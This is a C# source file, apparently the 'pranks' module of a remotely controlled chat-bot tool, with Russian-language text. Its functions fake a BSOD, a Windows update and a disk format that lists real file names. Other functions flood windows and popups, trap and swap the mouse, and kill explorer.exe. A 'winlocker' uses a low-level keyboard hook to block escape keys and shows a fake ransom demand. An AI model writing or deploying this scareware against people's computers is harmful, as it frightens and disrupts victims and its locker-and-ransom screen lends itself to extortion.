                    g.DrawImage(src, new Rectangle(0, 0, bmp.Width, bmp.Height),
                                0, 0, src.Width, src.Height, GraphicsUnit.Pixel, ia);
                }
            }
            finally { src.Dispose(); }
        }

        public static void DrawCenter(Bitmap bmp, string[] lines, string fam, float size, Color col, double cxRel, double cyPx)
        {
            using (Graphics g = Graphics.FromImage(bmp))
            using (Font font = new Font(fam, size, FontStyle.Bold))
            using (StringFormat sf = new StringFormat())
            using (Brush br = new SolidBrush(col))
            {
                sf.Alignment = StringAlignment.Center;
                sf.LineAlignment = StringAlignment.Center;
                g.DrawString(string.Join("\n", lines), font, br, new RectangleF(
                    (float)(cxRel * bmp.Width - bmp.Width), (float)cyPx, (float)(bmp.Width * 2), 600), sf);
            }
        }
    }
    // ============================================================
    //  приколы (перевод python 1:1)
    // ============================================================
    internal static class Pr
    {
        private static readonly Random Rnd = new Random();

        private static readonly object RndSync = new object();

        private static int R(int min, int max) { lock (RndSync) { return Rnd.Next(min, max + 1); } }

        public static void PressKey(int vk, int times)
        {
            for (int i = 0; i < times; i++)
            {
                N.keybd_event((byte)vk, 0, 0, 0);
                N.keybd_event((byte)vk, 0, 2, 0);
                Thread.Sleep(10);
            }
        }

        // ---------- экран и окна ----------
        private static void BsodActually()
        {
            Fx.Over(delegate
            {
                Form r = Fx.Full("#0078D7");
                Label sad = Fx.Lab("🙁", 120, "#ffffff", "#0078D7", false, "Segoe UI Emoji");
                Label main = Fx.Lab("Система уничтожает пользовательские файлы.\nПожалуйста, не закрывайте окно.", 18, "#ffffff", "#0078D7", false, "Segoe UI");
                Label pr = Fx.Lab("", 18, "#ffffff", "#0078D7", false, "Segoe UI");
                Label cur = Fx.Lab("", 12, "#cfe2ff", "#0078D7", false, "Consolas");
                Fx.Place(r, sad, 0.18, 0.20, "w");
                Fx.Place(r, main, 0.18, 0.40, "w");
                Fx.Place(r, pr, 0.18, 0.54, "w");
                Fx.Place(r, cur, 0.18, 0.65, "w");
                string[] VICTIMS = new string[] {
                    @"Users\Пк\Documents\диплом_финал_финал2.docx",
                    @"Users\Пк\Pictures\серия_лучших_селфи",
                    @"Users\Пк\Documents\пароли_новые_не_удалил.txt",
                    @"D:\архив\за_5_лет\всё_важное",
                    @"Users\Пк\Music\плейлист_души",
                    @"C:\Windows\System32\надеюсь_это_не_всё"
                };
                int pct = 0;
                Timer t = new Timer();
                t.Tick += delegate
                {
                    pct = Math.Min(100, pct + R(3, 11));
                    pr.Text = "Уничтожено: " + pct + "%";
                    cur.Text = "удаляем: " + VICTIMS[R(0, VICTIMS.Length - 1)];
                    if (pct >= 100)
                    {
                        cur.Text = "шутка. файлы на месте. ESC выход";
                        t.Stop();
                        Timer t2 = new Timer();
                        t2.Interval = 3500;
                        t2.Tick += delegate { t2.Stop(); try { r.Close(); } catch { } };
                        t2.Start();
                    }
                    else t.Interval = R(400, 1000);
                };
                r.Shown += delegate { t.Interval = 400; t.Start(); };
                Fx.EscClose(r);
                Fx.AutoClose(r, 45000);
                Application.Run(r);
            });
        }

        public static string Bsod() { BsodActually(); return "🖥 синий гость делает вид, что стерёт твою жизнь (ESC выручает)"; }

        private static void UpdateActually()
        {
            Fx.Over(delegate
            {
                Form r = Fx.Full("#003A6D");
                Label l1 = Fx.Lab("Обновление Windows", 34, "#ffffff", "#003A6D", true, "Segoe UI");
                Label l2 = Fx.Lab("0% завершено", 20, "#ffffff", "#003A6D", true, "Segoe UI");
                Label l3 = Fx.Lab("Не выключайте компьютер", 13, "#ffffff", "#003A6D", true, "Segoe UI");
                Fx.Place(r, l1, 0.5, 0.38, "mm");
                Fx.Place(r, l2, 0.5, 0.48, "mm");
                Fx.Place(r, l3, 0.5, 0.56, "mm");
                int v = 0;
                Timer t = new Timer();
                t.Interval = 2200;
                t.Tick += delegate
                {
                    v += R(0, 3);
                    if (v > 90) v = 0;
                    l2.Text = "Выполнено: " + v + "%";
                };
                r.Shown += delegate { t.Start(); };
                Fx.EscOnly(r);
                Application.Run(r);
            });
        }

        public static string UpdateFake() { UpdateActually(); return "🔄 фейк-обновление пошло — 0% может подняться до 90 и уйти снова в ноль (ESC — выход)"; }

        public static string Rickroll()
        {
            string url = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0&loop=1&playlist=dQw4w9WgXcQ";
            string[][] browsers = new string[][] {
                new string[] { @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "edge" },
                new string[] { @"C:\Program Files\Microsoft\Edge\Application\msedge.exe", "edge" },
                new string[] { @"C:\Program Files\Google\Chrome\Application\chrome.exe", "" },
                new string[] { @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe", "" }
            };
            foreach (string[] b in browsers)
            {
                if (File.Exists(b[0]))
                {
                    string args = "--kiosk=" + url + " --autoplay-policy=no-user-gesture-required --no-first-run --new-window";
                    if (b[1] == "edge") args += " --edge-kiosk-type=fullscreen";
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = b[0];
                    psi.Arguments = args;
                    psi.UseShellExecute = false;
                    try { Process.Start(psi); } catch { }
                    return "🎵 рикролл на весь экран (выйти: Alt+F4)";
                }
            }
            try { Process.Start(new ProcessStartInfo { FileName = url, UseShellExecute = true }); } catch { }
            return "🎵 рикролл открылся обычной вкладкой — киоска нет, но напряжение есть";
        }

        private static void InvertActually()
        {
            Fx.Over(delegate
            {
                Bitmap shot = Fx.GrabAll();
                Fx.Invert(shot);
                Form r = Fx.Full("#000000");
                PictureBox pb = new PictureBox();
                pb.Dock = DockStyle.Fill;
                pb.SizeMode = PictureBoxSizeMode.StretchImage;
                pb.Image = shot;
                r.Controls.Add(pb);
                r.KeyDown += delegate(object s, KeyEventArgs e) { if (e.KeyCode == Keys.Escape) { try { r.Close(); } catch { } } };
                pb.MouseDown += delegate { try { r.Close(); } catch { } };
                Fx.AutoClose(r, 15000);
                Application.Run(r);
            });
        }

        public static string Invert() { InvertActually(); return "🖼 экран вывернулся наизнанку — вернётся через 15с (ESC — сразу)"; }

        public static string Screamer()
        {
            InvertActually();
            try { Console.Beep(1800, 320); Console.Beep(1300, 320); Console.Beep(1800, 320); } catch { }
            return "🚨 скример ушёл: негатив + визг 3 секунды";
        }

        private static void BlackoutActually(int muteSecs, string hint)
        {
            Fx.Over(delegate
            {
                Form r = Fx.Full("#000000");
                Label lbl = Fx.Lab("", 44, "#c0392b", "#000000", true, "Segoe UI");
                Label sub = Fx.Lab("", 16, "#555555", "#000000", false, "Consolas");
                Fx.Place(r, lbl, 0.5, 0.5, "mm");
                Fx.Place(r, sub, 0.5, 0.62, "mm");
                DateTime deadline = DateTime.Now.AddSeconds(muteSecs);
                r.KeyDown += delegate(object s, KeyEventArgs e)
                {
                    if (e.KeyCode == Keys.Escape && DateTime.Now >= deadline) try { r.Close(); } catch { }
                };
                r.MouseDown += delegate { if (DateTime.Now >= deadline) try { r.Close(); } catch { } };
                Timer t1 = new Timer(); t1.Interval = muteSecs * 1000 + 1;
                t1.Tick += delegate { t1.Stop(); lbl.Text = hint; };
                Timer t2 = new Timer(); t2.Interval = muteSecs * 1000 + 1200;
                t2.Tick += delegate { t2.Stop(); sub.Text = "клик тоже работает"; };
                r.Shown += delegate { t1.Start(); t2.Start(); };
                Fx.AutoClose(r, 20000);
                Application.Run(r);
            });
        }

        public static string Blackout() { BlackoutActually(8, ";) это шутка — ESC выручит"); return "🖥 экран ушёл в чёрный — первые 8с без подсказок, 20с максимум"; }

        public static string Monoff()
        {
            IntPtr res;
            N.SendMessageTimeoutW((IntPtr)0xFFFF, 0x0112, 0xF170, 2, 2, 2000, out res);
            return "📱 экран выключен — шевельни мышью, чтобы вернуть";
        }

        public static string RotateDisplay()
        {
            N.DEVMODE dm = new N.DEVMODE();
            dm.dmSize = (short)Marshal.SizeOf(typeof(N.DEVMODE));
            if (!N.EnumDisplaySettingsW(null, -1, ref dm))
                return "🖥 не поворачивается (драйвер запретил)";
            string[] names = new string[] { "горизонтально", "на 90°", "вверх ногами", "на 270°" };
            dm.dmDisplayOrientation = (dm.dmDisplayOrientation + 1) % 4;
            dm.dmSize = (short)Marshal.SizeOf(typeof(N.DEVMODE));
            int rc = N.ChangeDisplaySettingsExW(null, ref dm, IntPtr.Zero, 0, IntPtr.Zero);
            if (rc == 0)
                return "🖥 экран повернулся: " + names[dm.dmDisplayOrientation] + " (тапай ещё — вернётся)";
            return "🖥 не повернулся — драйвер запретил";
        }

        public static string Flicker()
        {
            for (int i = 0; i < 15; i++)
            {
                N.keybd_event(0x5B, 0, 0, 0);
                N.keybd_event(0x44, 0, 0, 0);
                N.keybd_event(0x44, 0, 2, 0);
                N.keybd_event(0x5B, 0, 2, 0);
                Thread.Sleep(300);
            }
            return "🪟 рабочий стол моргал 15 раз";
        }

        public static string Dance()
        {
            IntPtr hwnd = N.GetForegroundWindow();
            N.RECT rc;
            N.GetWindowRect(hwnd, out rc);
            int w = rc.R - rc.L, h = rc.B - rc.T;
            try
            {
                for (int i = 0; i < 60; i++)
                {
                    N.MoveWindow(hwnd, rc.L + R(-120, 120), rc.T + R(-70, 70), w, h, true);
                    Thread.Sleep(80);
                }
            }
            finally
            {
                N.MoveWindow(hwnd, rc.L, rc.T, w, h, true);
            }
            return "🪟 окно потанцевало и вернулось на место";
        }

        // ---------- периферия ----------
        public static void FloodCmdLoop(long uid)
        {
            int i = 0;
            while (!K.FloodShouldStop(uid))
            {
                i++;
                try
                {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "cmd.exe";
                    psi.Arguments = "/c start \"\" /MAX cmd /k \"title окно №" + i + " — привет от бота\"";
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process.Start(psi);
                }
                catch { }
                Thread.Sleep(350);
            }
        }

        public static void FloodPopLoop(long uid)
        {
            string popup = Path.Combine(K.DATA_DIR, "popup.vbs");
            File.WriteAllText(popup, "x = MsgBox(\"Ваш скучный день закончился! Нажмите ок, если это правда\", 64, \"Окошко от бота\")", Encoding.GetEncoding(1251));
            while (!K.FloodShouldStop(uid))
            {
                try
                {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "wscript.exe";
                    psi.Arguments = "\"" + popup + "\"";
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process.Start(psi);
                }
                catch { }
                Thread.Sleep(600);
            }
        }

        public static void FloodDrunkLoop(long uid)
        {
            N.POINT p;
            while (!K.FloodShouldStop(uid))
            {
                try
                {
                    N.GetCursorPos(out p);
                    N.SetCursorPos(p.x + R(-45, 45), p.y + R(-45, 45));
                }
                catch { }
                Thread.Sleep(100);
            }
        }

        public static string Magnet()
        {
            DateTime end = DateTime.Now.AddSeconds(10);
            int cx = N.GetSystemMetrics(0) / 2, cy = N.GetSystemMetrics(1) / 2;
            while (DateTime.Now < end)
            {
                N.SetCursorPos(cx, cy);
                Thread.Sleep(150);
            }
            return "🧲 мышь льнула к центру 10 секунд";
        }

        public static string Edges()
        {
            DateTime end = DateTime.Now.AddSeconds(15);
            int w = N.GetSystemMetrics(0), h = N.GetSystemMetrics(1);
            N.POINT pt;
            int margin = 80;
            while (DateTime.Now < end)
            {
                N.GetCursorPos(out pt);
                if (pt.x < margin || pt.x > w - margin || pt.y < margin || pt.y > h - margin)
                    N.SetCursorPos(w / 2 + R(-120, 120), h / 2 + R(-90, 90));
                Thread.Sleep(50);
            }
            return "🧲 углы экрана были закрыты 15 секунд";
        }

        private static void JailActually(int seconds)
        {
            ThreadPool.QueueUserWorkItem(delegate
            {
                // watchdog: даже если всё рухнет — ClipCursor сбросится
                Thread.Sleep(seconds * 1000 + 10000);
                try { N.ClipCursor(IntPtr.Zero); } catch { }
            });
            Fx.Over(delegate
            {
                N.POINT p0;
                N.GetCursorPos(out p0);
                int cx = Math.Max(80, p0.x), cy = Math.Max(80, p0.y);
                int half = 28;
                N.RECT box = new N.RECT();
                box.L = cx - half; box.T = cy - half; box.R = cx + half; box.B = cy + half;

                Form jail = new Form();
                jail.FormBorderStyle = FormBorderStyle.None;
                jail.StartPosition = FormStartPosition.Manual;
                jail.Bounds = new Rectangle(cx - half, cy - half, half * 2, half * 2);
                jail.TopMost = true;
                jail.ShowInTaskbar = false;
                jail.BackColor = Color.FromArgb(0xFF, 0x2B, 0x2B);
                Label lb = new Label();
                lb.Text = "🔒\nЗАЛ";
                lb.Dock = DockStyle.Fill;
                lb.TextAlign = ContentAlignment.MiddleCenter;
                lb.ForeColor = Color.FromArgb(0xFF, 0x2B, 0x2B);
                lb.BackColor = Color.Black;
                lb.Font = new Font("Segoe UI Emoji", 16, FontStyle.Bold);
                lb.Padding = new Padding(0);
                lb.Margin = new Padding(0);
                lb.AutoSize = false;
                jail.Controls.Add(lb);

                DateTime end = DateTime.Now.AddSeconds(seconds);
                Timer t = new Timer();
                t.Interval = 50;
                t.Tick += delegate
                {
                    if (DateTime.Now >= end ||
                        (N.GetAsyncKeyState(0x1B) & 0x0001) != 0)
                    {
                        t.Stop();
                        try { jail.Close(); } catch { }
                        return;
                    }
                    N.ClipCursor(ref box);
                    N.SetCursorPos(cx + R(-5, 5), cy + R(-5, 5));
                };
                jail.Shown += delegate { t.Start(); };
                try { Application.Run(jail); }
                finally { t.Stop(); try { N.ClipCursor(IntPtr.Zero); } catch { } }
            });
        }

        public static string Jail() { JailActually(20); return "🔒 курсор в клетке 20с. держи ESC — вырвешься раньше"; }

        public static string MouseToggle()
        {
            bool cur = N.GetSystemMetrics(23) != 0;
            bool nw = !cur;
            N.SwapMouseButton(nw);
            using (RegistryKey k = Registry.CurrentUser.CreateSubKey(@"Control Panel\Mouse"))
            {
                k.SetValue("SwapMouseButton", nw ? "1" : "0", RegistryValueKind.String);
            }
            return nw ? "🙃 кнопки мыши поменялись местами" : "🙃 мышь вернулась в привычку";
        }

        public static string Cd()
        {
            StringBuilder buf = new StringBuilder(256);
            if (N.mciSendStringW("set cdaudio door open", buf, 256, IntPtr.Zero) != 0)
                return "💿 привода нет — шутка не взлетела";
            Thread.Sleep(2000);
            N.mciSendStringW("set cdaudio door closed", buf, 256, IntPtr.Zero);
            return "💿 привод открылся и захлопнулся обратно";
        }

        // ---------- стол и темы ----------
        public static string IconsToggle()
        {
            bool cur = false;
            using (RegistryKey k = Registry.CurrentUser.CreateSubKey(K.ADV_PATH))
            {
                object v = k.GetValue("HideIcons");
                cur = (v is int) ? ((int)v != 0) : false;
                bool nw = !cur;
                k.SetValue("HideIcons", nw ? 1 : 0, RegistryValueKind.DWord);
                cur = nw;
            }
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c taskkill /f /im explorer.exe && timeout /t 1 /nobreak >nul && start explorer.exe";
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
            }
            catch { }
            return cur ? "🖼 значки рабочего стола исчезли — ищем" : "🖼 значки вернулись на место";
        }

        public static string RegWallGet()
        {
            try
            {
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop"))
                {
                    if (k == null) return "";
                    object v = k.GetValue("Wallpaper");
                    return v == null ? "" : v.ToString();
                }
            }
            catch { return ""; }
        }

        public static void RegWallSet(string path)
        {
            N.SystemParametersInfoW(0x14, 0, path, 3);
        }

        public static string WallSub()
        {
            string orig = RegWallGet();
            string marker = Path.Combine(K.DATA_DIR, "orig_wall.txt");
            if (orig.Length > 0 && !File.Exists(marker))
                File.WriteAllText(marker, orig, Encoding.UTF8);
            Bitmap shot = Fx.GrabAll();
            string fake = Path.Combine(K.DATA_DIR, "fake_wall.png");
            shot.Save(fake, ImageFormat.Png);
            shot.Dispose();
            RegWallSet(fake);
            return "🖼 обои стали скриншотом экрана — рабочий стол выглядит живым, но не дышит. 🧷 вернёт старые обои";
        }

        public static string WallStare()
        {
            string orig = RegWallGet();
            string marker = Path.Combine(K.DATA_DIR, "orig_wall.txt");
            if (orig.Length > 0 && !File.Exists(marker))
                File.WriteAllText(marker, orig, Encoding.UTF8);
            Bitmap shot = Fx.GrabAll();
            using (Graphics g = Graphics.FromImage(shot))
            using (Font font = new Font("Arial", 140, FontStyle.Bold))
            using (StringFormat sf = new StringFormat())
            using (Brush br = new SolidBrush(Color.FromArgb(255, 30, 30)))
            {
                sf.Alignment = StringAlignment.Center;
                sf.LineAlignment = StringAlignment.Center;
                g.DrawString("Я ВСЁ ВИЖУ", font, br, new RectangleF(0, -30, shot.Width, 240), sf);
            }
            string fake = Path.Combine(K.DATA_DIR, "fake_wall.png");
            shot.Save(fake, ImageFormat.Png);
            shot.Dispose();
            RegWallSet(fake);
            return "🖼 обои теперь со скриншотом и надписью «Я ВСЁ ВИЖУ» — 🧷 вернёт старые";
        }

        public static string WallBack()
        {
            string marker = Path.Combine(K.DATA_DIR, "orig_wall.txt");
            if (!File.Exists(marker)) return "🧷 оригинал не записывался — возвращать нечего";
            string path = "";
            try { path = File.ReadAllText(marker, Encoding.UTF8).Trim(); } catch { }
            if (path.Length == 0 || !File.Exists(path))
                return "🧷 файл старых обоев пропал — верни вручную (Правый клик → Персонализация)";
            RegWallSet(path);
            try { File.Delete(marker); } catch { }
            return "🧷 старые обои восстановлены";
        }

        public static string SetWallpaper(string path)
        {
            bool ok;
            try { N.SystemParametersInfoW(20, 0, path, 3); ok = true; } catch { ok = false; }
            return ok ? "🌆 обои поставлены" : "🌆 обои не взялись (нужен jpg/bmp)";
        }

        public static string Notepad()
        {
            foreach (string _x in new string[] { "1", "1", "1" })
            {
                try { Process.Start("notepad.exe"); } catch { }
                Thread.Sleep(1200);
                N.TypeText("это не баг — это шутка :)\nбудет весело, не выключай\n");
            }
            return "🗒 3 блокнота выдали тайну";
        }

        // ---------- звук ----------
        public static string Beep()
        {
            try
            {
                int[] notes = new int[] { 392, 440, 494, 587, 494, 440, 392, 349, 330, 294, 330, 392, 262 };
                foreach (int f in notes) Console.Beep(f, 300);
                return "🎵 бип-мелодия отзвенела";
            }
            catch
            {
                return "🔇 звукового устройства нет — тишина в зале";
            }
        }

        public static string Siren()
        {
            try
            {
                DateTime end = DateTime.Now.AddSeconds(15);
                bool hi = false;
                while (DateTime.Now < end)
                {
                    Console.Beep(hi ? 750 : 950, 420);
                    hi = !hi;
                }
            }
            catch { }
            return "🎺 сирена отзвенела — соседи в курсе";
        }

        public static string Voice()
        {
            string phrase = "Привет! Твой компьютер был перепрошит. Сядь ровно и не забудь про осанку.";
            string ps = "$v = New-Object -ComObject SAPI.SpVoice; $v.Rate = 3; $v.Volume = 100; $v.Speak('" + phrase.Replace("'", "''") + "')";
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "powershell";
                psi.Arguments = "-NoProfile -Command -";
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                psi.RedirectStandardInput = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                Process p = Process.Start(psi);
                p.StandardInput.Write(ps);
                p.StandardInput.Flush();
                p.StandardInput.Close();
                if (!p.WaitForExit(30000)) { try { p.Kill(); } catch { } }
            }
            catch { }
            return "🗣 голос из ниоткуда изрёк мудрость";
        }

        public static string Volume() { PressKey(0xAF, 100); return "🔊 громкость в потолок"; }
        public static string Caps()
        {
            for (int i = 0; i < 30; i++) { N.keybd_event(0x14, 0, 0, 0); N.keybd_event(0x14, 0, 2, 0); Thread.Sleep(40); }
            return "⌨️ capslock отщёлкал 30 раз";
        }
        public static string Player() { for (int i = 0; i < 25; i++) { PressKey(0xB3, 1); Thread.Sleep(80); } return "▶️ плеер заикался 25 раз"; }

        // ---------- жёсткие (18+) ----------
        private static IntPtr _hook;
        private static N.HookProc _hookProc;
        private static uint _hookTid;
        private static ManualResetEvent _unlockEvt;
        private static readonly StringBuilder _ring = new StringBuilder();

        private static IntPtr HookProcRaw(int code, IntPtr wp, IntPtr lp)
        {
            if (code < 0) return N.CallNextHookEx(_hook, code, wp, lp);
            long w = wp.ToInt64();
            if (w == 0x0100 || w == 0x0104)
            {
                try
                {
                    N.KBDLL kb = (N.KBDLL)Marshal.PtrToStructure(lp, typeof(N.KBDLL));
                    int vk = kb.vkCode;
                    short g = N.GetAsyncKeyState(0x12);
                    bool alt = (g & -32768) != 0;
                    if (vk == 0x5B || vk == 0x5C) return (IntPtr)1;
                    if (vk == 0x09 && alt) return (IntPtr)1;
                    if (vk == 0x70 && alt) return (IntPtr)1;
                    if (vk == 0x1B) return (IntPtr)1;
                    if ((vk >= 0x30 && vk <= 0x39) || (vk >= 0x60 && vk <= 0x69))
                    {
                        _ring.Append((char)('0' + vk % 10));
                        if (_ring.Length > 16) _ring.Remove(0, _ring.Length - 16);
                        if (_ring.Length >= 4 && _ring.ToString().EndsWith(K.KB_CODE)) _unlockEvt.Set();
                        return (IntPtr)1;
                    }
                }
                catch { }
            }
            return N.CallNextHookEx(_hook, code, wp, lp);
        }

        private static void HookThread(DateTime deadline)
        {
            _hook = IntPtr.Zero;
            _hookProc = new N.HookProc(HookProcRaw);
            _hook = N.SetWindowsHookExW(13, _hookProc, IntPtr.Zero, 0);
            if (_hook == IntPtr.Zero) return;
            _hookTid = N.GetCurrentThreadId();
            ThreadPool.QueueUserWorkItem(delegate
            {
                int ms = (int)(deadline - DateTime.Now).TotalMilliseconds;
                if (ms < 1000) ms = 1000;
                Thread.Sleep(ms);
                try { N.PostThreadMessageW(_hookTid, 0x0012, 0, 0); } catch { }
            });
            N.MSG m = new N.MSG();
            while (N.GetMessageW(ref m, IntPtr.Zero, 0, 0) > 0)
            {
                N.TranslateMessage(ref m);
                N.DispatchMessageW(ref m);
                if (DateTime.Now > deadline) { try { N.PostThreadMessageW(_hookTid, 0x0012, 0, 0); } catch { } }
            }
            N.UnhookWindowsHookEx(_hook);
        }

        /// <summary>блокирующий: живёт, пока висит оверлей (как пайтоновский _winlock_worker)</summary>
        private static void WinlockActually(int countdown)
        {
            _unlockEvt = new ManualResetEvent(false);
            _ring.Clear();
            DateTime deadline = DateTime.Now.AddSeconds(countdown + 60);
            Thread hook = new Thread((ThreadStart)delegate { HookThread(deadline); });
            hook.IsBackground = true;
            hook.Start();
            ManualResetEvent done = new ManualResetEvent(false);
            Fx.RunSta(delegate
            {
                try
                {
                    Form root = Fx.Full("#070303");
                    Panel qr = new Panel();
                    qr.Size = new Size(252, 252);
                    qr.BackColor = Color.Black;
                    qr.Paint += delegate(object s, PaintEventArgs e)
                    {
                        Random rr = new Random();
                        for (int gx = 0; gx < 21; gx++)
                            for (int gy = 0; gy < 21; gy++)
                                if (rr.NextDouble() < 0.46)
                                    e.Graphics.FillRectangle(Brushes.WhiteSmoke, 3 + gx * 12, 3 + gy * 12, 8, 8);
                    };
                    Fx.Place(root, qr, 0.5, 0.26, "mm");
                    Label title = Fx.Lab("☠ ПК ЗАБЛОКИРОВАН ☠", 42, "#ff2b2b", "#070303", true, "Segoe UI");
                    Fx.Place(root, title, 0.5, 0.02, "n");
                    Label body = Fx.Lab("все файлы ушли под армейский замок:\nдокументы, фото, дипломы — всё сковано льдом\nоткуп: 3000₽. кошель оставлен в чате",
                                        16, "#e6d6d6", "#070303", false, "Segoe UI");
                    Fx.Place(root, body, 0.5, 0.47, "mm");
                    Label clock = Fx.Lab("", 60, "#ff2b2b", "#070303", true, "Consolas");
                    Fx.Place(root, clock, 0.5, 0.60, "mm");
                    Label whisper = Fx.Lab("", 13, "#6b4f4f", "#070303", false, "Consolas");
                    Fx.Place(root, whisper, 0.5, 0.71, "mm");

                    string[] WHISPERS = new string[] {
                        "мы читали историю браузера. всё.",
                        "веб-камера мигнула дважды — это не мы",
                        "диплом_финал_финал2.docx уже в шоке",
                        "не трогай Ctrl+Alt+Del — он с нами",
                        "cookies проданы. шоколадные."
                    };

                    bool allowClose = false;
                    bool finished = false;
                    root.FormClosing += delegate(object s, FormClosingEventArgs e)
                    {
                        if (!allowClose) e.Cancel = true;
                    };
                    root.Deactivate += delegate { try { root.Activate(); root.TopMost = true; } catch { } };
                    root.MouseDown += delegate { try { root.Activate(); root.TopMost = true; } catch { } };

                    Timer t = new Timer();
                    t.Interval = 1000;
                    int left = countdown;
                    t.Tick += delegate
                    {
                        try
                        {
                            if (finished) return;
                            if (_unlockEvt.WaitOne(0))
                            {
                                finished = true; t.Stop(); allowClose = true;
                                clock.Text = "КОД ПРИНЯТ";
                                clock.ForeColor = Fx.C("#39ff14");
                                whisper.Text = "владелец вспомнил пароль. файлы целы. шутка.";
                                whisper.ForeColor = Fx.C("#39ff14");
                                Timer t2 = new Timer();
                                t2.Interval = 3500;
                                t2.Tick += delegate { t2.Stop(); try { root.Close(); } catch { } };
                                t2.Start();
                                return;
                            }
                            if (left <= 0)
                            {
                                finished = true; t.Stop(); allowClose = true;
                                clock.Text = "ВРЕМЯ ВЫШЛО";
                                clock.ForeColor = Fx.C("#39ff14");
                                whisper.Text = "…и ровным счётом ничего. это была шутка.";
                                whisper.ForeColor = Fx.C("#39ff14");
                                Timer t2 = new Timer();
                                t2.Interval = 4000;
                                t2.Tick += delegate { t2.Stop(); try { root.Close(); } catch { } };
                                t2.Start();
                                return;
                            }
                            int mmn = left / 60, ssn = left % 60;
                            clock.Text = mmn.ToString() + ":" + ssn.ToString("00");
                            if (left % 5 == 0) whisper.Text = WHISPERS[R(0, WHISPERS.Length - 1)];
                            left -= 1;
                        }
                        catch { }
                    };
                    root.Shown += delegate { t.Start(); };
                    Fx.AutoClose(root, (countdown + 20) * 1000);
                    Application.Run(root);
                }
                catch { }
                finally
                {
                    done.Set();
                    try { N.PostThreadMessageW(_hookTid, 0x0012, 0, 0); } catch { }
                }
            });
            done.WaitOne();
        }

        public static string Winlock()
        {
            Fx.RunSta(delegate { WinlockActually(120); });
            return "🏴 WINLOCKER встал на 2 минуты.\nкод разблокировки: 0007 (набрать цифры прямо на экране)\nснимется и сам по таймеру — всё под контролем владельца";
        }

        private static List<string> FormatTargets()
        {
            List<string> pool = new List<string>();
            string[] dirs = new string[] { "Desktop", "Documents", "Downloads", "Pictures", "Music", "Videos" };
            string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            foreach (string name in dirs)
            {
                try
                {
                    DirectoryInfo di = new DirectoryInfo(Path.Combine(home, name));
                    foreach (FileSystemInfo e2 in di.GetFileSystemInfos())
                    {
                        pool.Add(e2.FullName);
                        if ((e2.Attributes & FileAttributes.Directory) != 0)
                        {
                            try
                            {
                                DirectoryInfo sub = new DirectoryInfo(e2.FullName);
                                foreach (FileSystemInfo p in sub.GetFileSystemInfos()) pool.Add(p.FullName);
                            }
                            catch { }
                        }
                    }
                }
                catch { }
            }
            try
            {
                string windir = Environment.GetEnvironmentVariable("WINDIR") ?? @"C:\Windows";
                DirectoryInfo sys = new DirectoryInfo(Path.Combine(windir, "System32"));
                foreach (FileInfo p in sys.GetFiles()) pool.Add(p.FullName);
            }
            catch { }
            if (pool.Count == 0) pool.Add(@"C:\шутка-запасной-файл.docx");
            if (pool.Count > 600) pool = pool.GetRange(0, 600);
            return pool;
        }

        private static void FormatActually()
        {
            Fx.Over(delegate
            {
                List<string> targets = FormatTargets();
                Form root = Fx.Full("#000000");
                RichTextBox txt = new RichTextBox();
                txt.Dock = DockStyle.Fill;
                txt.BackColor = Color.Black;
                txt.ForeColor = Fx.C("#d6d6d6");
                txt.Font = new Font("Consolas", 12);
                txt.BorderStyle = BorderStyle.None;
                txt.ReadOnly = true;
                root.Controls.Add(txt);
                Action<string, bool> push = delegate(string text, bool warn)
                {
                    try
                    {
                        txt.SelectionStart = txt.TextLength;
                        txt.SelectionColor = warn ? Fx.C("#ff4d4d") : Fx.C("#d6d6d6");
                        txt.AppendText(text + "\n");
                        txt.SelectionColor = txt.ForeColor;
                        txt.ScrollToCaret();
                    }
                    catch { }
                };
                string[] init = new string[] {
                    "Microsoft Windows [Version 10.0.26100.0007]",
                    "(c) Корпорация Хаоса. Все права утрачены.", "",
                    @"C:\Users\владелец>format C: /FS:NTFS /X /Q", "",
                    "ВНИМАНИЕ: ВСЕ ДАННЫЕ НА ДИСКЕ C: БУДУТ УНИЧТОЖЕНЫ!",
                    "Продолжить [Y/N]? Y", ""
                };
                int i = 0;
                Timer t = new Timer();
                t.Tick += delegate
                {
                    if (i < init.Length) { push(init[i], false); i++; t.Interval = 700; return; }
                    int idx = i - init.Length;
                    int total = targets.Count;
                    if (idx < total)
                    {
                        push("Удаление: " + targets[idx], false);
                        i++;
                        if (idx % 22 == 0)
                        {
                            int pct = (int)(idx / (double)total * 97);
                            push("Прогресс: " + pct + "%  [" + new string('█', pct / 5) + "]", false);
                        }
                        t.Interval = 45;
                        return;
                    }
                    t.Stop();
                    push("", false);
                    push("Диск C: очищен. Файлы утрачены навсегда.", true);
                    push("", false);
                    push("шутка. диск жив, файлы целы — выдохнул уже? :)", true);
                    push("это было представление. до встречи.", false);
                    Timer t2 = new Timer();
                    t2.Interval = 3500;
                    t2.Tick += delegate { t2.Stop(); try { root.Close(); } catch { } };
                    t2.Start();
                };
                root.Shown += delegate { t.Start(); };
                Fx.AutoClose(root, 75000);
                Fx.EscClose(root);
                Application.Run(root);
            });
        }

        public static string Format() { FormatActually(); return "🧨 «format C:» идёт (читает ТОЛЬКО имена, не трогает файлы). ESC — выход"; }

        private static void HackerActually()
        {
            Fx.Over(delegate
            {
                Form root = Fx.Full("#000600");
                Panel canvas = new Panel();
                canvas.Dock = DockStyle.Fill;
                canvas.BackColor = Fx.C("#000600");
                root.Controls.Add(canvas);
                int ncols = Math.Max(40, N.GetSystemMetrics(0) / 16);
                string GLYPHS = "01ФЦЧШЩЗХЪЭЮЯ$#%&@*+=<>アイウエオカキクケコ";
                string[] strs = new string[ncols];
                int[] ys = new int[ncols];
                Random rr = new Random();
